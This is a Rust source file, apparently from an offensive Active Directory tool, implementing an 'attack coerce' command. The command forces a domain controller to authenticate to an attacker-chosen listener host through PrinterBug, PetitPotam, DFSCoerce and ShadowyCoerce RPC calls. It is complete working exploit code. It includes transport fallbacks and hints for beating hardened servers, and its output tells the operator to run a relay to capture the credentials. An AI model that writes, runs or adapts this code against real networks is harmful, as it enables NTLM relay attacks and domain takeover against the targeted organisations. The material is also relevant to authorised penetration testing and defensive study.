//! DC authentication coercion via PrinterBug (MS-RPRN), PetitPotam (MS-EFSR),
//! DFSCoerce (MS-DFSNM), and ShadowyCoerce (MS-FSRVP).

use anyhow::Result;
use clap::Parser;

/// Coercion vector (pipe) selection for `attack coerce`.
///
/// Renamed from a bare `--pipe <string>` in 1.3.10 — clap now rejects
/// unknown values at parse time with a helpful list, instead of silently
/// forwarding through to `smb.open_pipe` where the failure surfaces as a
/// generic RPC fault a hundred lines later.
#[derive(clap::ValueEnum, Clone, Copy, Debug, PartialEq, Eq)]
pub(crate) enum CoercePipe {
    /// PrinterBug (MS-RPRN over \spoolss) — most reliable coercion on modern DCs.
    Spoolss,
    /// PetitPotam (MS-EFSR over \lsarpc) — restricted on Server 2016+ hardened DCs.
    Lsarpc,
    /// PetitPotam (MS-EFSR over \efsrpc) — restricted on Server 2016+ hardened DCs.
    Efsrpc,
    /// DFSCoerce (MS-DFSNM NetrDfsAddStdRoot over \netdfs).
    Netdfs,
    /// ShadowyCoerce (MS-FSRVP IsPathSupported over \FssagentRpc) — needs FS-VSS-Agent role.
    Fssagentrpc,
}

#[derive(Parser)]
pub(crate) struct CoerceArgs {
    #[arg(long)]
    pub host: String,
    #[arg(long)]
    pub domain: String,
    #[arg(long)]
    pub user: String,
    #[arg(long)]
    pub password: String,
    /// Attacker host the DC should authenticate to (UNC target)
    #[arg(long)]
    pub listener: String,
    /// Coercion vector (pipe name): spoolss (PrinterBug, MS-RPRN — most reliable on modern
    /// DCs), lsarpc / efsrpc (PetitPotam, MS-EFSR — restricted on 2016+), netdfs (DFSCoerce,
    /// MS-DFSNM), fssagentrpc (ShadowyCoerce, MS-FSRVP — needs FS-VSS-Agent role).
    #[arg(long, value_enum, ignore_case = true, default_value = "spoolss")]
    pub pipe: CoercePipe,
    /// PrinterBug server name to open (defaults to --host; modern spoolers want the hostname/FQDN, not an IP)
    #[arg(long)]
    pub target: Option<String>,
}

/// PetitPotam-style coercion: make the DC authenticate to `--listener` via MS-EFSR.
pub(crate) async fn coerce(mut a: CoerceArgs) -> Result<()> {
    a.password = crate::resolve_secret(&a.password, "ADHAMMER_PASSWORD")?;
    use smb2_client::SmbClient;

    let mut smb = SmbClient::connect(&a.host).await?;
    smb.login(&a.host, &a.domain, &a.user, &a.password).await?;
    smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;

    match a.pipe {
        CoercePipe::Spoolss => {
            // PrinterBug (MS-RPRN): open a printer on the target, then RFFPCNEx → callback to us.
            use dcerpc::rprn::{printerbug_tcp, PrinterBug};
            // Try the \spoolss SMB pipe first; modern spoolers only expose ncacn_ip_tcp (via EPM).
            let target = a.target.clone().unwrap_or_else(|| a.host.clone());
            let via_pipe = match smb.open_pipe("spoolss").await {
                Ok(pipe) => {
                    let mut client = PrinterBug::bind(&mut smb, pipe).await?;
                    Some(client.coerce(&target, &a.listener).await)
                }
                Err(_) => None,
            };
            let result = match via_pipe {
                Some(r) => r,
                None => {
                    printerbug_tcp(
                        &a.host,
                        &a.domain,
                        &a.user,
                        &a.password,
                        &target,
                        &a.listener,
                    )
                    .await
                }
            };
            match result {
                Ok(status) => {
                    println!("[+] PrinterBug (RFFPCNEx) accepted — status {status:#010x}");
                    println!("    {} spooler attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
                }
                Err(e) => {
                    println!(
                        "[-] PrinterBug failed/patched (spooler off or remote RPC blocked): {e}"
                    )
                }
            }
        }
        CoercePipe::Netdfs => {
            // MS-DFSNM (DFSCoerce): NetrDfsAddStdRoot over \netdfs — makes the DC auth to ServerName.
            use dcerpc::dfsnm::CoerceClient as DfsClient;
            let pipe = smb.open_pipe("netdfs").await?;
            let mut client =
                DfsClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
                    .await?;
            match client.coerce(&a.listener).await {
                Ok(status) => {
                    println!("[+] NetrDfsAddStdRoot accepted via \\netdfs — status {status:#010x}");
                    println!("    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
                }
                Err(e) => println!(
                    "[-] DFSCoerce failed on this DC ({e}) — try `--pipe spoolss` (PrinterBug); netdfs is picky about transport/auth-level on modern Windows"
                ),
            }
        }
        CoercePipe::Fssagentrpc => {
            // MS-FSRVP (ShadowyCoerce): IsPathSupported over \FssagentRpc — makes the VSS provider
            // auth to ShareName. Needs the File Server VSS Agent Service enabled.
            use dcerpc::fsrvp::CoerceClient as VssClient;
            let pipe = smb.open_pipe("FssagentRpc").await?;
            let mut client =
                VssClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
                    .await?;
            match client.coerce(&a.listener).await {
                Ok(status) => {
                    println!("[+] IsPathSupported accepted via \\FssagentRpc — status {status:#010x}");
                    println!("    {} VSS provider attempted auth to \\\\{}\\... (run a relay/listener to capture)", a.host, a.listener);
                }
                Err(e) => println!(
                    "[-] ShadowyCoerce failed ({e}) — needs FS-VSS-Agent role installed AND Backup Operators rights; try `--pipe spoolss` for a reliable alternative"
                ),
            }
        }
        CoercePipe::Lsarpc | CoercePipe::Efsrpc => {
            // MS-EFSR (PetitPotam) over \lsarpc or \efsrpc.
            use dcerpc::efsr::CoerceClient;
            let pipe_name = match a.pipe {
                CoercePipe::Lsarpc => "lsarpc",
                CoercePipe::Efsrpc => "efsrpc",
                _ => unreachable!(),
            };
            let pipe = smb.open_pipe(pipe_name).await?;
            let mut client =
                CoerceClient::bind_sealed(&mut smb, pipe, &a.domain, &a.user, &a.password, &a.host)
                    .await?;
            match client.coerce(&a.listener).await {
                Ok(status) => {
                    println!(
                        "[+] EfsRpcOpenFileRaw accepted via \\{pipe_name} — status {status:#010x}"
                    );
                    println!(
                        "    DC {} attempted auth to \\\\{}\\... (run a relay/listener to capture)",
                        a.host, a.listener
                    );
                }
                Err(e) => println!(
                    "[-] EFSR via \\{pipe_name} failed ({e}) — MS-EFSR is restricted/removed on Server 2016+ hardening; use `--pipe spoolss` (PrinterBug) instead"
                ),
            }
        }
    }
    Ok(())
}
